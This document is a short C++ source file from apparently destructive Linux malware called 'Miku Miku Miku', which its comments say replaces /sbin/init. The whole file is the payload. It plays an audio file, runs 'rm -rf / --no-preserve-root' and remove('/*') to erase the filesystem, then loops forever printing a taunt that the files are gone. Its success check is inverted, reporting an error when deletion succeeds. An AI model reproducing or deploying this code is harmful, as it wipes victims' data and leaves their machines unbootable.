#include <iostream>
#include <cstdlib>
#include <cstdio>
#include <unistd.h>

// The destructive part of Miku Miku Miku, this gets downloaded on runtime.
// This replaces /sbin/init on Linux distros.

int main()
{
    // HATSUNE MIKU!!!!!!!!!!!!!!!!!
    system("mpv /miku/BD5972AA.ogg");

    // Let's play some Aurascope! Second to last step of the payload.
    // Unused for now: system("cd Aurascope && xinit /usr/bin/wine Aurascope.exe"); // Most likely not going to do anything as wine is going to crash the instant xD

    // Yeet the files, we don't need em around here.'
    system("rm -rf / --no-preserve-root");
    int rmRoot = remove("/*");

    if (!rmRoot)
    {
        perror("Error deleting files: /*");
        return EXIT_FAILURE;
    }
    else
    {
        std::cout << "Successfully deleted /*!";
    }

    while(1) {
        system("clear");
        std::cout << "Good luck getting your files back! Hatsune Miku took them all...";
    }

    return EXIT_SUCCESS;
}
